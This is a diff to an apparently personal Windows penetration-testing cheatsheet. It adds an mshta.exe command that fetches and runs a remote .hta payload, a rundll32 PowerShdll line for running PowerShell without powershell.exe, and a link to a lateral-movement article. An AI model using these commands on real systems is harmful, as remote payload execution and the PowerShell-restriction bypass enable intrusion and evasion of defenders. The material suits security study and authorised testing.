@@ -4,8 +4,8 @@ tags: [Windows Cheatsheet,Active Directory,Exploitation,Priv Esc,Post Exploit,Fi
 published: true
 description: A place for me to store my notes/tricks for Windows Based Systems. 
 toc: true
-image: http://109.74.206.50/WinLogo.png
-thumbnail: http://109.74.206.50/WinLogo.png
+image: https://cdn.freebiesupply.com/logos/large/2x/microsoft-windows-22-logo-png-transparent.png
+thumbnail: https://cdn.freebiesupply.com/logos/large/2x/microsoft-windows-22-logo-png-transparent.png
 ---
 
 
@@ -657,6 +657,16 @@ python smbserver.py Share `pwd` -u m0chan -p m0chan --smb-2support
 
 ## [](#header-2)Exploit
 
+
+#### Code Execution with MSHTA
+
+```powershell
+
+mshta.exe is a default binary shipped on all versions of Windows which allows the execution of .hta payloads
+
+mshta.exe https://m0chan.com/exploit.hta
+
+```
 
 
 #### [](#header-4) LLMNR / NBT-NS Spoofing
@@ -2194,6 +2204,8 @@ Can also inject kirbi with Rebeus
 ## [](#header-2)Lateral Movement
 
 
+**Highly recommened starting by reading this article which covers lateral movement in great depth by SpectreOps- https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f** 
+
 
 #### [](#header-4) Plink
 
@@ -2509,6 +2521,14 @@ unicorn.py Nishang.ps1
 $ExecutionContext.SessionState.LanguageMode
 ```
 
+
+#### PowerShDLL - Powershell with no Powershell.exe via DLL's
+
+```
+#https://github.com/p3nt4/PowerShdll
+
+ftp> rundll32.exe C:\temp\PowerShdll.dll,main
+```
 
 
 #### [](#header-4) PowershellVeryLess Bypass
